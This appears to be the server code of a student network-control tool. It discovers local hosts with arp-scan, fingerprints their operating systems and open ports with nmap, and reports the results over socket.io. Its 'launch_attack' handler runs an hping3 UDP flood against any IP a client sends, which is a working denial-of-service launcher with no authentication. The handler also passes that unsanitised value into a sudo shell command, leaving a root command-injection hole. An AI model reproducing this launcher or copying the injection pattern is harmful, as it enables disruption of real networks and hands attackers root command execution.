const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { exec } = require('child_process');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

let isScanning = false;

app.use(express.static('public'));

io.on('connection', (socket) => {
    socket.on('start_scan', () => {
        if (isScanning) return;
        isScanning = true;

        // Step 1: Rapid Recon (Arp-scan)
        exec('sudo arp-scan --localnet --retry=2', (error, stdout) => {
            if (error) { isScanning = false; return; }

            const lines = stdout.split('\n');
            const targets = [];
            lines.forEach(line => {
                const match = line.match(/^(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9:-]+)\s+(.*)/);
                if (match) targets.push(match);
            });

            if (targets.length === 0) { isScanning = false; return; }

            let doneCount = 0;
            targets.forEach(m => {
                socket.emit('device_found', { ip: m[1], mac: m[2].toUpperCase(), name: m[3] ? m[3].trim() : "Unknown Hardware" });

                // Step 2: Deep Fingerprinting (Nmap with OS-Guessing)
                exec(`sudo nmap -O --osscan-guess -sV --max-rtt-timeout 150ms ${m[1]}`, (err, nmapOut) => {
                    doneCount++;
                    let os = "System Hidden";
                    let ports = [];

                    if (!err && nmapOut) {
                        const osM = nmapOut.match(/OS details: (.*?)\n/) || nmapOut.match(/Running: (.*?)\n/);
                        if (osM) os = osM[1].split(',')[0].replace(/(\(.*\))/g, "");

                        const portRegex = /^(\d+)\/(tcp|udp)\s+open/gm;
                        let prt;
                        while ((prt = portRegex.exec(nmapOut)) !== null) ports.push(prt[1]);
                    }

                    socket.emit('device_updated', { ip: m[1], os, ports: ports.join(', ') });
                    if (doneCount === targets.length) isScanning = false;
                });
            });
        });
    });

    socket.on('launch_attack', (ip) => {
        exec(`sudo hping3 --flood --udp -p 80 ${ip}`);
        console.log(`[PFE-ALERT] Attack Simulation on ${ip}`);
    });
});

server.listen(3000, () => console.log('Aegis NetControl: http://localhost:3000'));
